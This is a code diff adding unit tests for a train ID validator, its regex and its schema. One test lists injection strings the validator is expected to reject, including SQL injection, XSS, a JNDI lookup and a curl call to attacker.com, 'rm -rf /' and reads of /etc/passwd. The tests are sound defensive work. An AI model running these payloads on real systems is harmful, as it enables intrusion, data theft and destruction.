@@ -2,6 +2,7 @@ import { describe, it, expect } from 'bun:test'
 import {
   // Regex patterns
   UUID_REGEX,
+  TRAIN_ID_REGEX,
 
   // Validation functions
   isValidUUID,
@@ -11,6 +12,7 @@ import {
   isValidEmail,
   isValidDomain,
   isValidDatabaseUrl,
+  isValidTrainId,
 
   // Zod schemas
   uuidSchema,
@@ -20,6 +22,7 @@ import {
   emailSchema,
   domainSchema,
   databaseUrlSchema,
+  trainIdSchema,
   paginationSchema,
   dateRangeSchema,
   conversationBranchParamsSchema,
@@ -285,6 +288,151 @@ describe('Validation Utilities', () => {
       const parsed = conversationBranchParamsSchema.parse(valid)
       expect(parsed.conversationId).toBe(valid.conversationId)
       expect(parsed.branchId).toBe('main')
+    })
+
+    it('should validate train ID schema with valid values', () => {
+      const validTrainIds = [
+        'abc123',
+        'MyTrainId123',
+        'train_id_123',
+        'train-id-123',
+        'Train_ID-123_test',
+        'a',
+        'A'.repeat(255),
+      ]
+
+      validTrainIds.forEach(trainId => {
+        expect(() => trainIdSchema.parse(trainId)).not.toThrow()
+      })
+    })
+
+    it('should reject invalid train IDs in schema', () => {
+      const invalidTrainIds = [
+        '',
+        'A'.repeat(256),
+        'train@id',
+        'train.id',
+        'train id',
+        '; DROP TABLE users;--',
+        '<script>alert("xss")</script>',
+        '../../../etc/passwd',
+      ]
+
+      invalidTrainIds.forEach(trainId => {
+        expect(() => trainIdSchema.parse(trainId)).toThrow()
+      })
+    })
+  })
+
+  describe('Train ID Validation', () => {
+    it('should validate correct train IDs', () => {
+      const validTrainIds = [
+        'abc123',
+        'MyTrainId123',
+        'train_id_123',
+        'train-id-123',
+        'Train_ID-123_test',
+        'a',
+        'A'.repeat(255),
+      ]
+
+      validTrainIds.forEach(trainId => {
+        expect(isValidTrainId(trainId)).toBe(true)
+        expect(TRAIN_ID_REGEX.test(trainId)).toBe(true)
+      })
+    })
+
+    it('should reject invalid train IDs', () => {
+      const invalidTrainIds = [
+        '', // empty
+        'A'.repeat(256), // too long
+        'train@id', // @ symbol
+        'train.id', // dot
+        'train+id', // plus
+        'train id', // space
+        'train/id', // slash
+        'train\\id', // backslash
+        'train#id', // hash
+        'train$id', // dollar
+        'train%id', // percent
+        'train&id', // ampersand
+        'train*id', // asterisk
+        'train!id', // exclamation
+        'train?id', // question
+        'train=id', // equals
+        'train[id]', // brackets
+        'train{id}', // braces
+        'train|id', // pipe
+        'train:id', // colon
+        'train;id', // semicolon
+        "train'id", // single quote
+        'train"id', // double quote
+        'train<id>', // angle brackets
+        'train,id', // comma
+        'café', // unicode
+        'résumé', // unicode
+        'Train🚂ID', // emoji
+        'тест', // cyrillic
+        '测试', // chinese
+        '日本語', // japanese
+      ]
+
+      invalidTrainIds.forEach(trainId => {
+        expect(isValidTrainId(trainId)).toBe(false)
+        expect(TRAIN_ID_REGEX.test(trainId)).toBe(false)
+      })
+    })
+
+    it('should handle injection attempts', () => {
+      const injectionAttempts = [
+        '; DROP TABLE users;--',
+        "'; DROP TABLE users;--",
+        '<script>alert("xss")</script>',
+        '${jndi:ldap://attacker.com/a}',
+        '../../../etc/passwd',
+        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+        '`rm -rf /`',
+        '$(curl attacker.com)',
+        '{{7*7}}',
+        '<%=7*7%>',
+        '#{7*7}',
+        'javascript:alert(1)',
+        "1' OR '1'='1",
+        "'; SELECT * FROM users WHERE ''='",
+        '1; DELETE FROM users;--',
+        '../config',
+        '../../secrets',
+        '; ls -la',
+        '| cat /etc/passwd',
+        '`id`',
+        '$(whoami)',
+        '&& rm -rf /',
+      ]
+
+      injectionAttempts.forEach(attempt => {
+        expect(isValidTrainId(attempt)).toBe(false)
+        expect(TRAIN_ID_REGEX.test(attempt)).toBe(false)
+      })
+    })
+
+    it('should validate edge cases', () => {
+      // Single character cases
+      expect(isValidTrainId('a')).toBe(true)
+      expect(isValidTrainId('Z')).toBe(true)
+      expect(isValidTrainId('0')).toBe(true)
+      expect(isValidTrainId('9')).toBe(true)
+      expect(isValidTrainId('_')).toBe(true)
+      expect(isValidTrainId('-')).toBe(true)
+
+      // Maximum length
+      expect(isValidTrainId('a'.repeat(255))).toBe(true)
+      expect(isValidTrainId('a'.repeat(256))).toBe(false)
+
+      // Empty and whitespace
+      expect(isValidTrainId('')).toBe(false)
+      expect(isValidTrainId(' ')).toBe(false)
+      expect(isValidTrainId('\t')).toBe(false)
+      expect(isValidTrainId('\n')).toBe(false)
     })
   })
 })
